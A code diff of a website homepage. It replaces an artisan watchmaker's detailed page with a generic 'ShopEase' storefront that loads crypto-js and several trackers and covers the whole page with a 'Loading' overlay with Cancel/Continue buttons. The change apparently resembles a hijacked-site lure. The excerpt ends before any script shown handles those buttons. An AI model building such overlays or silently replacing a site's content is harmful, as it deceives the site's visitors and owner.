@@ -1,435 +1,312 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pendulum Craft | Bespoke Astronomical Regulators, Haute Horlogerie & Constant-Force Timepieces</title>
-    <meta name="description" content="Pendulum Craft handcrafts bespoke astronomical pendulum regulators, constant-force escapement wristwatches, and rose-engine turned guilloché dials in New York.">
-    <link rel="canonical" href="https://pendulumcraft.com/index.html">
-    <meta name="robots" content="index, follow">
-    <meta property="og:site_name" content="Pendulum Craft">
-    <meta property="og:title" content="Pendulum Craft | Bespoke Astronomical Regulators & Timepieces">
-    <meta property="og:description" content="Handcrafted astronomical regulators, constant-force wristwatches, and bespoke horological complications.">
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://pendulumcraft.com/index.html">
-    <meta property="og:image" content="https://pendulumcraft.com/images/hero_pendulum_regulator.jpg">
-    <meta name="twitter:card" content="summary_large_image">
-    <!-- Google tag (gtag.js) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-      gtag('config', 'G-0LY0HY7L01');
-    </script>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,500;0,600;0,700;1,600&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="assets/css/style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-TD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
-    <header class="site-header">
-        <div class="header-inner">
-            <a href="index.html" class="brand-logo">
-                <span class="logo-mark">⏳</span>
-                <span class="logo-text">PENDULUM <span>CRAFT</span></span>
-            </a>
-            <nav class="main-nav" id="mainNav">
-                <ul class="nav-list">
-                    <li class="nav-item"><a href="index.html" class="nav-link active">Home</a></li>
-                    <li class="nav-item"><a href="about.html" class="nav-link ">About</a></li>
-                    <li class="nav-item"><a href="index.html#timepieces" class="nav-link">Timepieces</a></li>
-                    <li class="nav-item"><a href="blog.html" class="nav-link ">Blog</a></li>
-                    <li class="nav-item"><a href="contact.html" class="nav-link ">Contact</a></li>
-                    <li class="nav-item nav-item-policy"><a href="privacy-policy.html" class="nav-link ">Privacy Policy</a></li>
-                    <li class="nav-item nav-item-policy"><a href="terms-and-conditions.html" class="nav-link ">Terms & Conditions</a></li>
-                    <li class="nav-item nav-item-policy"><a href="disclaimer.html" class="nav-link ">Disclaimer</a></li>
-                    <li class="nav-item nav-item-policy"><a href="cookie-policy.html" class="nav-link ">Cookie Policy</a></li>
-                </ul>
-            </nav>
-            <div class="nav-actions">
-                <a href="contact.html" class="btn btn-header">Reserve Timepiece</a>
-                <button class="mobile-toggle" id="mobileToggle" aria-label="Toggle navigation menu" aria-expanded="false">
-                    <span class="hamburger-box"><span class="hamburger-inner"></span></span>
-                </button>
-            </div>
-        </div>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
     </header>
 
-    <main class="site-main">
-        <!-- Section 1: Hero Haute Horlogerie Editorial Showcase -->
-        <section class="hero-section">
-            <div class="container">
-                <div class="hero-grid">
-                    <div class="hero-content">
-                        <div class="hero-badges">
-                            <span class="badge-pill">Invar Compensated Regulators</span>
-                            <span class="badge-pill">Mercer Street Horology Bench</span>
-                            <span class="badge-pill">Constant-Force Remontoire</span>
-                        </div>
-                        <h1 class="hero-title">Celestial Seconds <span>Measured in Invar & Rose Gold</span></h1>
-                        <p class="hero-description">Pendulum Craft resurrects the pinnacle of astronomical timekeeping. We engineer bespoke longcase regulators, deadbeat chronometers, and wristwatches equipped with constant-force gravity remontoires for discerning horological collectors globally.</p>
-                        <div class="hero-cta">
-                            <a href="contact.html" class="btn btn-primary">Commission Timepiece</a>
-                            <a href="about.html" class="btn btn-secondary">Explore Horological Bedrock</a>
-                        </div>
-                        <div class="hero-stats">
-                            <div class="stat-item">
-                                <div class="stat-number">&plusmn;0.2s</div>
-                                <div class="stat-label">Daily Drift Tolerance</div>
-                            </div>
-                            <div class="stat-item">
-                                <div class="stat-number">100%</div>
-                                <div class="stat-label">Rose-Engine Turned Dials</div>
-                            </div>
-                            <div class="stat-item">
-                                <div class="stat-number">36,000</div>
-                                <div class="stat-label">Vibrations per Hour</div>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="hero-media">
-                        <div class="hero-img-wrap">
-                            <img src="images/hero_pendulum_regulator.jpg" alt="Astronomical precision pendulum regulator with blued steel hands and Invar rod" width="600" height="600" loading="eager">
-                            <div class="hero-badge-overlay">
-                                <strong>Graham Deadbeat Escapement</strong>
-                                <span>Zero recoil &bull; Barometric aneroid capsule</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
 
-        <!-- Section 2: Horological Bedrock & Isochronism -->
-        <section class="section">
-            <div class="container">
-                <div class="split-block">
-                    <div class="split-media">
-                        <div class="split-img-wrap">
-                            <img src="images/watchmaker_loupe_bench.jpg" alt="Master horologist poising balance wheel with precision tweezers under binocular microscope" width="600" height="450" loading="lazy">
-                        </div>
-                    </div>
-                    <div class="split-content">
-                        <span class="section-badge">Horological Bedrock</span>
-                        <h2 class="section-title">The Quest for True Isochronism: <span>Defeating Thermal Expansion</span></h2>
-                        <p>In classical mechanical horology, temperature fluctuations represent the fatal adversary of precision. As temperature rises, conventional brass or steel pendulum rods expand, lengthening the center of oscillation and slowing the clock's harmonic frequency.</p>
-                        <p>At Pendulum Craft, our timekeeping bedrock is forged in Charles Édouard Guillaume's Nobel Prize-winning metallurgy. We utilize genuine nickel-iron Invar alloy rods possessing a thermal expansion coefficient near zero (under 1.2 &times; 10⁻⁶ K⁻¹), paired with zinc-mercury counter-compensating cylindrical bobs. This unshakeable mechanical anchor ensures astronomical chronometer rates that defy seasonal climate oscillations.</p>
-                        <ul class="feature-list">
-                            <li><strong>Invar 36 Alloy Rods:</strong> Vacuum-melted alloy with zero dimensional thermal drift.</li>
-                            <li><strong>Barometric Aneroid Capsules:</strong> Auto-compensates for atmospheric air density drag.</li>
-                            <li><strong>Synthetic Ruby Pallets:</strong> Friction-polished synthetic corundum jewels.</li>
-                        </ul>
-                    </div>
-                </div>
-            </div>
-        </section>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
 
-        <!-- Section 3: Signature Capsule Collection -->
-        <section class="section section-ivory" id="timepieces">
-            <div class="container">
-                <div class="section-header">
-                    <span class="section-badge">Atelier Capsule</span>
-                    <h2 class="section-title">Master Timepieces <span>& Regulators</span></h2>
-                    <p class="section-subtitle">Each commission is an individual work of micro-mechanical sculpture, built to order in limited annual editions.</p>
-                </div>
-                <div class="cards-grid-3">
-                    <div class="card card-with-img">
-                        <img src="images/skeleton_watch_movement.jpg" alt="Skeletonized astronomical wrist regulator with constant force remontoire" class="card-img-top" width="400" height="220" loading="lazy">
-                        <div class="card-body">
-                            <h3 class="card-title">The Sovereign Wrist Regulator</h3>
-                            <p class="card-text">A 41mm 18K rose gold chronometer featuring separated regulator dial displays (hours at 12, jumping deadbeat seconds at center, sweeping minutes).</p>
-                            <a href="contact.html" class="btn btn-outline" style="width: 100%; margin-top: 1rem;">View Specifications</a>
-                        </div>
-                    </div>
-                    <div class="card card-with-img">
-                        <img src="images/antique_clockwork_chassis.jpg" alt="Standing astronomical floor regulator clock in hand-rubbed mahogany case" class="card-img-top" width="400" height="220" loading="lazy">
-                        <div class="card-body">
-                            <h3 class="card-title">The Mercer Observatory Clock</h3>
-                            <p class="card-text">A freestanding seconds-beating pendulum regulator with Invar compensation, twin gravity-arm impulse escapement, and 30-day weight drive.</p>
-                            <a href="contact.html" class="btn btn-outline" style="width: 100%; margin-top: 1rem;">View Specifications</a>
-                        </div>
-                    </div>
-                    <div class="card card-with-img">
-                        <img src="images/luxury_chronometer_hands.jpg" alt="Bespoke marine chronometer in solid brass gimbaled deck box" class="card-img-top" width="400" height="220" loading="lazy">
-                        <div class="card-body">
-                            <h3 class="card-title">The Marine Tourbillon Deck Box</h3>
-                            <p class="card-text">A gimbaled marine navigation chronometer housed in solid brass and ebony, driven by a helical hairspring and fusée-and-chain transmission.</p>
-                            <a href="contact.html" class="btn btn-outline" style="width: 100%; margin-top: 1rem;">View Specifications</a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 4: Constant Force Escapement & Remontoire Science -->
-        <section class="section">
-            <div class="container">
-                <div class="split-block reverse">
-                    <div class="split-media">
-                        <div class="split-img-wrap">
-                            <img src="images/escapement_gear_train.jpg" alt="Close-up of constant-force spring remontoire and escape wheel gear tooth profile" width="600" height="450" loading="lazy">
-                        </div>
-                    </div>
-                    <div class="split-content">
-                        <span class="section-badge">Horological Physics</span>
-                        <h2 class="section-title">Constant-Force Remontoires: <span>Immunity from Mainspring Torque Decay</span></h2>
-                        <p>In standard mechanical watches, the coiled mainspring exerts maximum force when fully wound, gradually decaying over 48 hours. This changing torque alters balance wheel amplitude, causing the watch to gain time initially and lose time as reserve depletes.</p>
-                        <p>Pendulum Craft eliminates torque decay through a one-second spring remontoire. A secondary micro-hairspring situated directly on the escape wheel arbor is rewound by the gear train once every second. The regulating organ receives an unvarying, mathematically constant impulse of energy regardless of whether the mainspring is fully wound or entering its final hour of power reserve.</p>
-                        <ul class="feature-list">
-                            <li><strong>One-Second Re-Wind Cycle:</strong> Completely decouples gear train friction from the balance.</li>
-                            <li><strong>Deadbeat True Seconds:</strong> Jumping seconds display synchronized with astronomical time.</li>
-                            <li><strong>Linear Amplitude Stability:</strong> 310-degree balance amplitude sustained across 72 hours.</li>
-                        </ul>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 5: The Mercer Street Horological Atelier -->
-        <section class="section section-ivory">
-            <div class="container">
-                <div class="split-block">
-                    <div class="split-media">
-                        <div class="split-img-wrap">
-                            <img src="images/mercer_watch_atelier.jpg" alt="Mercer Street New York watchmaking studio and precision micro-lathes" width="600" height="450" loading="lazy">
-                        </div>
-                    </div>
-                    <div class="split-content">
-                        <span class="section-badge">Manhattan Workshop</span>
-                        <h2 class="section-title">Micro-Mechanics Bench <span>at 181 Mercer Street</span></h2>
-                        <p>Located in Manhattan's historic cast-iron district, Pendulum Craft operates an independent haute horlogerie atelier. In an era dominated by corporate conglomerate assembly lines, our workshop crafts fewer than 40 bespoke regulators and wristwatches annually.</p>
-                        <p>Every bridge is chamfered (anglaged) by hand using gentian wood pegs and diamond paste. Every pinion is burnished on historical Jacot pivot lathes. Each finished timepiece represents hundreds of hours of manual finishing by a single master horologist whose personal signature is engraved on the balance cock.</p>
-                        <a href="contact.html" class="btn btn-primary" style="margin-top: 1rem;">Schedule Atelier Visit</a>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 6: Hand-Turned Guilloché Rose-Engine Dials -->
-        <section class="section">
-            <div class="container">
-                <div class="section-header">
-                    <span class="section-badge">Decorative Mastery</span>
-                    <h2 class="section-title">Rose-Engine Guilloché <span>& Grand Feu Enamel</span></h2>
-                    <p class="section-subtitle">Why hand-turned engine-turning on antique rose lathes remains the pinnacle of dial art.</p>
-                </div>
-                <div class="cards-grid-3">
-                    <div class="card">
-                        <div class="card-icon">🌀</div>
-                        <h3 class="card-title">Clous de Paris Hobnail</h3>
-                        <p class="card-text">Turned line by line on hand-cranked straight-line lathes, carving thousands of tiny four-sided pyramidal prisms into solid sterling silver blanks.</p>
-                    </div>
-                    <div class="card">
-                        <div class="card-icon">🌾</div>
-                        <h3 class="card-title">Grain d'Orge Barleycorn</h3>
-                        <p class="card-text">An undulating, organic weave pattern generated on rose-engine cam rosettes, scattering ambient light in radiating concentric waves.</p>
-                    </div>
-                    <div class="card">
-                        <div class="card-icon">🔥</div>
-                        <h3 class="card-title">Grand Feu Enameling</h3>
-                        <p class="card-text">Pulverized silica and metallic oxides fused to gold dials at 820°C across five kiln firings, yielding an eternal porcelain luster that never fades.</p>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 7: Bespoke Complications & Custom Orders -->
-        <section class="section section-ivory">
-            <div class="container">
-                <div class="section-header">
-                    <span class="section-badge">Bespoke Horology</span>
-                    <h2 class="section-title">Custom Complications <span>& Case Metallurgy</span></h2>
-                    <p class="section-subtitle">Tailored to your astronomical coordinates, aesthetic preferences, and wrist architecture.</p>
-                </div>
-                <div class="cards-grid-2">
-                    <div class="card">
-                        <h3 class="card-title">Astronomical Complications</h3>
-                        <p class="card-text">Incorporate bespoke celestial displays into your timepiece, calculated specifically for your home coordinates anywhere on Earth.</p>
-                        <ul class="feature-list" style="margin-top: 1rem;">
-                            <li>Equation of Time cam showing true solar vs. mean solar time</li>
-                            <li>Three-dimensional spherical moonphase accurate to 122 years</li>
-                            <li>Sidereal time regulator for astronomical observatories</li>
-                        </ul>
-                        <a href="contact.html" class="btn btn-primary" style="margin-top: 1.5rem;">Configure Complications</a>
-                    </div>
-                    <div class="card">
-                        <h3 class="card-title">Noble Metal Casework</h3>
-                        <p class="card-text">Machined from solid ingots of 18K ethical fair-mined rose gold, 950 platinum, or forged tantalum with welded teardrop lugs and domed sapphire crystals.</p>
-                        <ul class="feature-list" style="margin-top: 1rem;">
-                            <li>Flame-blued steel hands tempered at 290°C</li>
-                            <li>Hand-sewn Mississippiensis alligator straps</li>
-                            <li>Custom caliber engraving and hallmark registration</li>
-                        </ul>
-                        <a href="contact.html" class="btn btn-primary" style="margin-top: 1.5rem;">Select Case Metals</a>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 8: Horologist & Collector Endorsements -->
-        <section class="section">
-            <div class="container">
-                <div class="section-header">
-                    <span class="section-badge">Collector Acclaim</span>
-                    <h2 class="section-title">Acclaimed by Horological Purists <span>& Connoisseurs</span></h2>
-                    <p class="section-subtitle">Read what independent chronometer evaluators and collectors say about our timepieces.</p>
-                </div>
-                <div class="cards-grid-3">
-                    <div class="testimonial-card">
-                        <p class="testimonial-quote">"The deadbeat seconds action on the Sovereign Wrist Regulator is the crispest I have witnessed in thirty years of collecting. It jumps with mathematical certainty."</p>
-                        <div class="testimonial-author">
-                            <div class="author-info">
-                                <strong>Philippe Moreau</strong>
-                                <span>Curator, Geneva Horological Society</span>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="testimonial-card">
-                        <p class="testimonial-quote">"The Invar pendulum clock standing in our study has held an astonishing rate of under one second per month over two full winter cycles. It is a modern astronomical triumph."</p>
-                        <div class="testimonial-author">
-                            <div class="author-info">
-                                <strong>Dr. Julian Kester</strong>
-                                <span>Astrophysicist & Chronometer Collector, London</span>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="testimonial-card">
-                        <p class="testimonial-quote">"Their hand-turned rose engine guilloché dials rival the antique masterpieces of Abraham-Louis Breguet. The reflection under sunlight is breathtaking."</p>
-                        <div class="testimonial-author">
-                            <div class="author-info">
-                                <strong>Marcus Von Berg</strong>
-                                <span>Horological Historian, Vienna</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 9: Frequently Answered Inquiries -->
-        <section class="section section-ivory">
-            <div class="container">
-                <div class="section-header">
-                    <span class="section-badge">Horological Science</span>
-                    <h2 class="section-title">Frequently Asked Questions <span>On Precision Timekeeping</span></h2>
-                    <p class="section-subtitle">Insights into our escapements, servicing cycles, and astronomical certifications.</p>
-                </div>
-                <div class="faq-accordion">
-                    <div class="accordion-item active">
-                        <button class="accordion-header">
-                            <span>What is the functional difference between deadbeat seconds and standard seconds?</span>
-                            <span class="accordion-icon">+</span>
-                        </button>
-                        <div class="accordion-content">
-                            <p>In standard mechanical watches, the second hand sweeps smoothly at 5 to 10 micro-vibrations per second. A deadbeat seconds mechanism (seconde morte) utilizes a specialized escapement brake or remontoire that halts the second hand, allowing it to jump precisely once per full second, exactly mirroring astronomical pendulum regulators.</p>
-                        </div>
-                    </div>
-                    <div class="accordion-item">
-                        <button class="accordion-header">
-                            <span>How often does a constant-force mechanical regulator require servicing?</span>
-                            <span class="accordion-icon">+</span>
-                        </button>
-                        <div class="accordion-content">
-                            <p>Because our movements utilize synthetic Moebius micro-lubricants treated with fluoropolymer epilame surface barriers to prevent oil migration, our wrist regulators operate reliably on a 5-to-7-year service interval, while standing Invar pendulum clocks require maintenance only once every decade.</p>
-                        </div>
-                    </div>
-                    <div class="accordion-item">
-                        <button class="accordion-header">
-                            <span>Are your timepieces tested by independent chronometer observatories?</span>
-                            <span class="accordion-icon">+</span>
-                        </button>
-                        <div class="accordion-content">
-                            <p>Yes. Every finished movement undergoes our rigorous 21-day internal testing protocol across 6 physical positions and 3 temperature extremes (8°C, 23°C, 38°C), and can be submitted upon request for official observatory chronometer certification at Besançon or COSC.</p>
-                        </div>
-                    </div>
-                    <div class="accordion-item">
-                        <button class="accordion-header">
-                            <span>What is the typical completion timeline for a bespoke commission?</span>
-                            <span class="accordion-icon">+</span>
-                        </button>
-                        <div class="accordion-content">
-                            <p>Bespoke wrist regulators require 6 to 9 months of individual hand fabrication, engine-turning, and regulation. Full-scale astronomical standing regulators require 9 to 14 months depending on casework cabinet joinery and astronomical complication specifications.</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 10: VIP Atelier Reservation CTA -->
-        <section class="section">
-            <div class="container">
-                <div class="cta-banner">
-                    <h2>Commission Your Horological Legacy</h2>
-                    <p>Schedule a private consultation at our Mercer Street atelier or begin your bespoke astronomical timepiece commission with our master watchmakers.</p>
-                    <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap;">
-                        <a href="contact.html" class="btn btn-secondary">Request Atelier Consultation</a>
-                        <a href="about.html" class="btn btn-outline" style="color: #FFFFFF; border-color: #FFFFFF;">Explore Timekeeping Bedrock</a>
-                    </div>
-                </div>
-            </div>
-        </section>
-    </main>
-
-    <footer class="site-footer">
-        <div class="container">
-            <div class="footer-grid">
-                <div class="footer-col brand-col">
-                    <a href="index.html" class="footer-logo">
-                        <span class="logo-mark">⏳</span>
-                        <span class="logo-text">PENDULUM <span>CRAFT</span></span>
-                    </a>
-                    <p class="footer-tagline">Architects of bespoke astronomical regulators, constant-force escapements, and haute horlogerie wristwatches hand-crafted in New York with Invar compensation rods.</p>
-                    <div class="footer-contact-info">
-                        <p><strong>Mercer Horological Atelier:</strong> 181 Mercer Street, New York, NY 10012, United States</p>
-                        <p><strong>Direct Telephony:</strong> <a href="tel:+18887775845">+1-888-777-5845</a></p>
-                        <p><strong>Atelier Concierge:</strong> <a href="mailto:atelier@pendulumcraft.com">atelier@pendulumcraft.com</a></p>
-                    </div>
-                </div>
-                <div class="footer-col">
-                    <h4 class="footer-heading">Haute Horlogerie</h4>
-                    <ul class="footer-links">
-                        <li><a href="index.html">Atelier Home</a></li>
-                        <li><a href="about.html">Horological Bedrock</a></li>
-                        <li><a href="blog.html">Technical Monographs</a></li>
-                        <li><a href="contact.html">Bespoke Commissions</a></li>
-                    </ul>
-                </div>
-                <div class="footer-col">
-                    <h4 class="footer-heading">Horological Science</h4>
-                    <ul class="footer-links">
-                        <li><a href="blog/invar-and-elinvir-metallurgy-in-pendulum-compensation.html">Invar & Elinvar Metallurgy</a></li>
-                        <li><a href="blog/deadbeat-vs-recoil-escapement-kinematics.html">Deadbeat Escapement Kinematics</a></li>
-                        <li><a href="blog/isochronism-and-the-huygens-cycloidal-cheeks.html">Huygens Cycloidal Isochronism</a></li>
-                        <li><a href="blog/constant-force-escapements-and-remontoire-mechanisms.html">Constant-Force Remontoires</a></li>
-                        <li><a href="blog/hand-turned-guilloche-dials-on-rose-engine-lathes.html">Rose-Engine Guilloché Dials</a></li>
-                        <li><a href="blog/horological-lubrication-and-synthetic-micro-viscosity.html">Synthetic Micro-Lubrication</a></li>
-                    </ul>
-                </div>
-                <div class="footer-col">
-                    <h4 class="footer-heading">Trust & Legal</h4>
-                    <ul class="footer-links">
-                        <li><a href="privacy-policy.html">Privacy Policy</a></li>
-                        <li><a href="terms-and-conditions.html">Terms & Conditions</a></li>
-                        <li><a href="disclaimer.html">Horological Disclaimer</a></li>
-                        <li><a href="cookie-policy.html">Cookie Policy</a></li>
-                    </ul>
-                </div>
-            </div>
-            <div class="footer-bottom">
-                <div class="footer-bottom-inner">
-                    <p class="copyright">&copy; 2026 Pendulum Craft. All rights reserved. Bespoke Astronomical Regulators & Haute Horlogerie Timepieces.</p>
-                    <div class="footer-legal-links">
-                        <a href="privacy-policy.html">Privacy</a>
-                        <a href="terms-and-conditions.html">Terms</a>
-                        <a href="disclaimer.html">Disclaimer</a>
-                        <a href="cookie-policy.html">Cookies</a>
-                    </div>
-                </div>
-            </div>
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
-    </footer>
-    <button class="back-to-top" id="backToTop" aria-label="Back to top">↑</button>
-    <script src="assets/js/main.js"></script>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
